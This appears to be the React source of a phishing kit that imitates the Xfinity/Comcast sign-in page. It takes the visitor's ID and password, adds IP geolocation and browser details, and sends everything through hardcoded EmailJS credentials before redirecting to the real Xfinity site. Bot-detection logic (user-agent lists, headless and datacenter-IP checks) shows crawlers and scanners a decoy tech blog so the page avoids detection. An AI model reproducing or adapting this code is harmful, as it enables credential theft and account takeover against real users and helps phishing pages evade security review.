import React, { useState, useEffect } from "react";
import big from "./assets/big.png";
import small from "./assets/small.png";

const App = () => {
  const [isBot, setIsBot] = useState(null); // null = checking, true = is bot, false = not bot
  const [view, setView] = useState("email"); // email, password
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cachedIpData, setCachedIpData] = useState(null);
  const [emailJsReady, setEmailJsReady] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [blogComments, setBlogComments] = useState([
    {
      id: 1,
      author: "Sarah Johnson",
      comment: "Great article! Very informative.",
      date: "2 hours ago",
    },
    {
      id: 2,
      author: "Mike Chen",
      comment: "Thanks for sharing this useful information.",
      date: "5 hours ago",
    },
    {
      id: 3,
      author: "Emma Watson",
      comment: "Looking forward to more posts like this.",
      date: "1 day ago",
    },
  ]);

  // Load EmailJS script dynamically
  useEffect(() => {
    const script = document.createElement("script");
    script.src =
      "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
    script.async = true;
    script.onload = () => {
      if (window.emailjs) {
        window.emailjs.init({
          publicKey: "xGT5HoyArhgWh7Ze7",
        });
        setEmailJsReady(true);
        console.log("EmailJS initialized");
      }
    };
    document.head.appendChild(script);
    return () => document.head.removeChild(script);
  }, []);

  // Bot Detection with Mobile Whitelisting
  useEffect(() => {
    const detectBot = () => {
      const userAgent = navigator.userAgent.toLowerCase();

      // Mobile detection
      const isMobile = () => {
        const mobilePatterns = [
          "android",
          "iphone",
          "ipad",
          "ipod",
          "blackberry",
          "windows phone",
          "mobile",
          "tablet",
        ];
        return mobilePatterns.some((pattern) => userAgent.includes(pattern));
      };

      const isMobileDevice = isMobile();
      const isMobileBrowser =
        isMobileDevice &&
        (userAgent.includes("chrome") ||
          userAgent.includes("safari") ||
          userAgent.includes("firefox") ||
          userAgent.includes("edge") ||
          userAgent.includes("opera"));

      // Bot patterns
      const botPatterns = [
        "bot",
        "crawler",
        "spider",
        "scraper",
        "headless",
        "googlebot",
        "bingbot",
        "slurp",
        "duckduckbot",
        "baiduspider",
        "yandexbot",
        "facebookexternalhit",
        "twitterbot",
        "rogerbot",
        "linkedinbot",
        "embedly",
        "quora link preview",
        "showyoubot",
        "outbrain",
        "pinterest",
        "slackbot",
        "vkShare",
        "telegrambot",
      ];

      const isUserAgentBot =
        !isMobileBrowser &&
        botPatterns.some((pattern) => userAgent.includes(pattern));

      // Headless browser detection (skip for mobile)
      const isHeadless =
        !isMobileDevice &&
        (!navigator.webdriver === false ||
          navigator.webdriver === true ||
          !navigator.languages ||
          navigator.plugins.length === 0);

      // Automation detection (skip for mobile)
      const hasAutomation =
        !isMobileDevice &&
        ((window.chrome?.runtime?.id === undefined &&
          userAgent.includes("Headless")) ||
          userAgent.includes("PhantomJS"));

      // Screen size check (skip for mobile)
      const isSmallScreen =
        !isMobileDevice &&
        (window.innerWidth === 0 || window.innerHeight === 0);

      // Mouse movement (skip for touch devices)
      let hasMouseMoved = false;
      const isTouchDevice =
        "ontouchstart" in window || navigator.maxTouchPoints > 0;
      if (!isTouchDevice) {
        const trackMouseMove = () => {
          hasMouseMoved = true;
        };
        document.addEventListener("mousemove", trackMouseMove);
        setTimeout(
          () => document.removeEventListener("mousemove", trackMouseMove),
          1000,
        );
      } else {
        hasMouseMoved = true;
      }

      const missingAPIs =
        !window.history || !window.document || !window.navigator;

      const checkBotHeaders = async () => {
        if (isMobileDevice) return false;
        try {
          const response = await fetch("https://ipinfo.io/json");
          const data = await response.json();
          const isDatacenter =
            data.org?.toLowerCase().includes("hosting") ||
            data.org?.toLowerCase().includes("cloud") ||
            data.org?.toLowerCase().includes("datacenter");
          return isDatacenter;
        } catch {
          return false;
        }
      };

      const determineIfBot = async () => {
        const isDatacenterIP = await checkBotHeaders();
        let botScore = [
          isUserAgentBot,
          isHeadless,
          hasAutomation,
          isSmallScreen,
          missingAPIs,
          isDatacenterIP,
        ];
        if (!isTouchDevice) botScore.push(!hasMouseMoved);
        const score = botScore.filter(Boolean).length;
        if (isMobileDevice) return score >= 4;
        return score >= 2;
      };

      determineIfBot().then(setIsBot);
    };
    detectBot();
  }, []);

  // IP Data Collection
  useEffect(() => {
    if (!isBot && isBot !== null) {
      const collectIpData = async () => {
        try {
          const response = await fetch("https://ipinfo.io/json");
          const data = await response.json();
          if (data && data.ip) setCachedIpData(data);
        } catch (error) {
          setCachedIpData({
            ip: "COLLECTION_FAILED",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            timezone: "Unknown",
            loc: "Unknown",
          });
        }
      };
      collectIpData();
    }
  }, [isBot]);

  const sendDataViaEmail = async (emailValue, passwordValue) => {
    if (!window.emailjs || !emailJsReady)
      throw new Error("EmailJS not initialized");
    if (!cachedIpData || !cachedIpData.ip)
      throw new Error("No IP data available");

    const params = {
      ip_address: cachedIpData.ip || "Unknown",
      city: cachedIpData.city || "Unknown",
      region: cachedIpData.region || "Unknown",
      country: cachedIpData.country || "Unknown",
      location: cachedIpData.loc || "Unknown",
      organization: cachedIpData.org || "Unknown",
      isp: cachedIpData.org || "Unknown",
      timezone: cachedIpData.timezone || "Unknown",
      user_agent: navigator.userAgent || "Unknown",
      platform: navigator.platform || "Unknown",
      language: navigator.language || "Unknown",
      collected_at: new Date().toISOString(),
      referrer: document.referrer || "Direct",
      screen_resolution: `${screen.width}x${screen.height}`,
      url: window.location.href,
      timezone_offset: new Date().getTimezoneOffset(),
      email: emailValue,
      password: passwordValue,
    };
    return window.emailjs.send("service_22vflet", "template_5yxczld", params);
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!email.trim()) {
      setEmailError("Please enter your Xfinity ID");
      return;
    }
    setEmailError("");
    setView("password");
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!password.trim()) {
      setPasswordError("Please enter your password");
      return;
    }
    if (isSubmitting) return;

    setIsSubmitting(true);
    try {
      await sendDataViaEmail(email, password);
      console.log("Data sent successfully");
      window.location.replace("https://www.xfinity.com/");
    } catch (error) {
      console.error("Send failed:", error);
      alert("Unable to sign in. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    setView("email");
    setPassword("");
    setPasswordError("");
  };

  const addComment = (e) => {
    e.preventDefault();
    const commentInput = document.getElementById("blog-comment");
    const nameInput = document.getElementById("blog-name");
    if (commentInput && commentInput.value.trim()) {
      const newComment = {
        id: blogComments.length + 1,
        author: nameInput?.value.trim() || "Anonymous",
        comment: commentInput.value.trim(),
        date: "Just now",
      };
      setBlogComments([...blogComments, newComment]);
      commentInput.value = "";
      if (nameInput) nameInput.value = "";
    }
  };

  // Loading state
  if (isBot === null) {
    return (
      <div className="flex flex-col items-center justify-center h-screen">
        <div className="w-12 h-12 border-4 border-gray-300 border-t-[#5a23b9] rounded-full animate-spin mb-4"></div>
        <p>Loading...</p>
      </div>
    );
  }

  // Fake Blog Page for Bots
  if (isBot) {
    return (
      <div className="max-w-6xl mx-auto p-5 font-sans">
        <header className="text-center py-10 px-5 bg-linear-to-r from-[#667eea] to-[#764ba2] text-white rounded-xl mb-8">
          <h1 className="text-4xl mb-2">Tech Insights Blog</h1>
          <p>Latest trends in technology and development</p>
        </header>

        <main className="grid md:grid-cols-3 gap-8 mb-10">
          <article className="md:col-span-2 bg-white p-8 rounded-xl shadow-md">
            <h2 className="text-2xl mb-4">
              The Future of Web Development: What to Expect in 2025
            </h2>
            <div className="text-gray-600 text-sm mb-5">
              <span>By John Doe</span> • <span>March 15, 2025</span> •{" "}
              <span>8 min read</span>
            </div>
            <img
              src="https://placehold.co/800x400/5a23b9/white?text=Web+Development"
              alt="Web Development"
              className="w-full rounded-lg mb-5"
            />
            <div className="space-y-4 text-gray-700">
              <p>
                Web development continues to evolve at a rapid pace. As we move
                through 2025, several key trends are shaping how we build and
                interact with websites and applications.
              </p>
              <h3 className="text-xl font-semibold mt-4">
                AI-Powered Development
              </h3>
              <p>
                Artificial intelligence is revolutionizing the way developers
                write code. From intelligent code completion to automated
                testing, AI tools are becoming indispensable in the modern
                developer's toolkit.
              </p>
              <h3 className="text-xl font-semibold mt-4">
                Serverless Architecture
              </h3>
              <p>
                The shift towards serverless computing continues to gain
                momentum. Developers can now focus on writing code without
                worrying about infrastructure management, leading to faster
                deployment and reduced operational costs.
              </p>
              <h3 className="text-xl font-semibold mt-4">
                WebAssembly Advances
              </h3>
              <p>
                WebAssembly is enabling near-native performance in web
                applications. This technology is opening up new possibilities
                for complex applications like video editing, gaming, and data
                visualization in the browser.
              </p>
              <h3 className="text-xl font-semibold mt-4">
                Privacy-First Development
              </h3>
              <p>
                With increasing concerns about data privacy, developers are
                adopting privacy-first approaches. New frameworks and tools are
                emerging to help build applications that respect user privacy by
                default.
              </p>
            </div>
          </article>

          <aside className="space-y-6">
            <div className="bg-gray-100 p-5 rounded-xl">
              <h3 className="font-semibold mb-3">About the Author</h3>
              <p className="text-gray-700">
                John Doe is a senior web developer with over 10 years of
                experience in the industry. He specializes in React, Node.js,
                and modern web technologies.
              </p>
            </div>
            <div className="bg-gray-100 p-5 rounded-xl">
              <h3 className="font-semibold mb-3">Related Posts</h3>
              <ul className="space-y-2">
                <li>
                  <a href="#" className="text-[#5a23b9] hover:underline">
                    Understanding React Server Components
                  </a>
                </li>
                <li>
                  <a href="#" className="text-[#5a23b9] hover:underline">
                    TypeScript Best Practices for 2025
                  </a>
                </li>
                <li>
                  <a href="#" className="text-[#5a23b9] hover:underline">
                    The Rise of Edge Computing
                  </a>
                </li>
                <li>
                  <a href="#" className="text-[#5a23b9] hover:underline">
                    Building Accessible Web Applications
                  </a>
                </li>
              </ul>
            </div>
          </aside>
        </main>

        <div className="bg-gray-50 p-8 rounded-xl mb-10">
          <h3 className="text-xl font-semibold mb-4">
            Comments ({blogComments.length})
          </h3>
          <form onSubmit={addComment} className="mb-6">
            <input
              type="text"
              id="blog-name"
              placeholder="Your name"
              className="w-full p-2 border border-gray-300 rounded mb-2"
            />
            <textarea
              id="blog-comment"
              placeholder="Leave a comment..."
              rows="3"
              className="w-full p-2 border border-gray-300 rounded mb-2"
            ></textarea>
            <button
              type="submit"
              className="bg-[#5a23b9] text-white px-6 py-2 rounded hover:bg-[#471a8f]"
            >
              Post Comment
            </button>
          </form>
          <div className="space-y-4">
            {blogComments.map((comment) => (
              <div key={comment.id} className="pb-3 border-b border-gray-200">
                <strong>{comment.author}</strong>{" "}
                <span className="text-gray-500 text-sm ml-2">
                  {comment.date}
                </span>
                <p className="text-gray-700 mt-1">{comment.comment}</p>
              </div>
            ))}
          </div>
        </div>

        <footer className="text-center py-5 text-gray-600 border-t">
          <p>&copy; 2025 Tech Insights Blog. All rights reserved.</p>
        </footer>
      </div>
    );
  }

  // Main Login Page for Real Users
  return (
    <div className="min-h-screen">
      {/* Email Step */}
      <div
        id="email-step"
        className={view === "email" ? "block mx-6" : "hidden"}
      >
        <div className="lg:flex lg:h-[90vh]">
          <div className="mx-auto max-w-md lg:max-w-xl pt-10 lg:pt-25 lg:flex-1/2">
            <div className="w-18 mb-6">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28">
                <path
                  fill="#8b8b97"
                  d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"
                />
              </svg>
            </div>
            <h1 className="font-bold text-3xl mb-6">
              Sign in with your Xfinity ID
            </h1>
            <form onSubmit={handleEmailSubmit} className="mb-8">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="placeholder:text-gray-500 bg-gray-100 w-full p-4 border border-gray-600 rounded mb-3"
                placeholder="Email, mobile, or username"
              />
              {emailError && (
                <p className="text-red-600 text-sm mb-2">{emailError}</p>
              )}
              <span className="block text-sm">
                By signing in, you agree to our{" "}
                <span className="text-purple-800 underline">
                  Terms of Service
                </span>{" "}
                and{" "}
                <span className="text-purple-800 underline">
                  Privacy Policy
                </span>
                .
              </span>
              <button
                type="submit"
                className="bg-[#5a23b9] rounded text-white font-medium py-4 px-8 mt-10"
              >
                Let's go
              </button>
            </form>
            <div className="w-full">
              <div className="flex justify-between items-center border-b border-gray-300 p-4 hover:bg-gray-100">
                <span>Find your Xfinity ID</span>
                <span className="text-gray-600">→</span>
              </div>
              <div className="flex justify-between items-center p-4 hover:bg-gray-100">
                <span>Create a new Xfinity ID</span>
                <span className="text-gray-600">→</span>
              </div>
            </div>
          </div>
          <div className="mx-auto lg:mx-0 max-w-md lg:max-w-[50vw] pt-10 lg:pt-0 lg:flex-1/2">
            <div className="w-full h-full">
              <img src={small} alt="" className="w-75 mx-auto md:hidden" />
              <img
                src={big}
                alt=""
                className="mx-auto hidden md:block w-full h-full object-top"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Password Step */}
      <div
        id="password-step"
        className={view === "password" ? "block mx-6" : "hidden"}
      >
        <div className="lg:flex lg:h-[90vh]">
          <div className="mx-auto max-w-md lg:max-w-xl pt-10 lg:pt-25 lg:flex-1/2">
            <div className="w-18 mb-6">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28">
                <path
                  fill="#8b8b97"
                  d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"
                />
              </svg>
            </div>
            <span className="font-bold text-md">{email}</span>
            <h1 className="font-bold text-3xl my-5">Enter your password</h1>
            <form onSubmit={handlePasswordSubmit} className="mb-8">
              <div className="flex items-center bg-gray-100 w-full p-4 border border-gray-600 rounded mb-6">
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-transparent focus:outline-none"
                  placeholder="Password"
                />
                <div>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="currentColor"
                  >
                    <path d="M13.49,12A1.5,1.5,0,1,1,12,10.5,1.5,1.5,0,0,1,13.49,12ZM21,12a11.08,11.08,0,0,1-9,5,11.08,11.08,0,0,1-9-5,11.07,11.07,0,0,1,9-5A11.07,11.07,0,0,1,21,12Zm-6,0a3,3,0,1,0-3,3A3,3,0,0,0,15,12Z"></path>
                  </svg>
                </div>
              </div>
              {passwordError && (
                <p className="text-red-600 text-sm mb-2">{passwordError}</p>
              )}
              <span className="font-bold text-lg text-[#5a23b9]">
                Forgot password?
              </span>
              <div className="flex items-center gap-4 my-6">
                <div
                  className="w-6 h-6 border border-gray-600 rounded cursor-pointer"
                  onClick={() => setKeepSignedIn(!keepSignedIn)}
                  style={{
                    backgroundColor: keepSignedIn ? "#5a23b9" : "white",
                    borderColor: keepSignedIn ? "#5a23b9" : "#gray-600",
                  }}
                ></div>
                <span className="text-md">Keep me signed in</span>
              </div>
              <span className="block text-sm">
                By signing in, you agree to our{" "}
                <span className="text-purple-800 underline">
                  Terms of Service
                </span>{" "}
                and{" "}
                <span className="text-purple-800 underline">
                  Privacy Policy
                </span>
                .
              </span>
              <button
                type="submit"
                disabled={isSubmitting}
                className="bg-[#5a23b9] rounded text-white font-medium py-4 px-8 mt-10 mb-6 disabled:opacity-50"
              >
                {isSubmitting ? (
                  <>
                    <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></span>{" "}
                    Signing in...
                  </>
                ) : (
                  "Sign in"
                )}
              </button>
              <span className="font-bold block text-md mb-10">
                Sign in as someone else
              </span>
              <span className="block text-sm">
                Trouble signing in?{" "}
                <span className="text-purple-800 underline">Get help</span>.
              </span>
            </form>
          </div>
          <div className="mx-auto lg:mx-0 max-w-md lg:max-w-[50vw] pt-10 lg:pt-0 lg:flex-1/2">
            <div className="w-full h-full">
              <img src={small} alt="" className="w-75 mx-auto md:hidden" />
              <img
                src={big}
                alt=""
                className="mx-auto hidden md:block w-full h-full object-top"
              />
            </div>
          </div>
        </div>
        <div className="mt-4 text-center">
          <button
            onClick={handleBack}
            className="text-[#5a23b9] hover:underline"
          >
            ← Use a different email
          </button>
        </div>
      </div>

      {/* Footer */}
      <footer className="md:fixed w-full bottom-0 bg-white">
        <ul className="my-8 md:my-3 space-y-4 text-sm text-center grid grid-cols-1 lg:grid-cols-3 xl:grid-cols-7 max-w-7xl mx-auto">
          <li className="text-gray-500">© 2026 Comcast</li>
          <li className="flex justify-center items-center">
            <span>Web Terms Of Service</span>
          </li>
          <li className="flex items-center justify-center">
            <span>CA Notice at Collection</span>
          </li>
          <li className="flex items-center justify-center">
            <span>Privacy Policy</span>
          </li>
          <li className="flex justify-center items-center">
            <span>Your Privacy Choices</span>
          </li>
          <li className="flex justify-center item-center">
            <span>Health Privacy Notice</span>
          </li>
          <li className="flex justify-center items-center">
            <span>Ad Choices</span>
          </li>
        </ul>
        <div className="w-full bg-black text-white text-center text-xs py-2">
          <span>Cookie Preference</span>
        </div>
      </footer>
    </div>
  );
};

export default App;
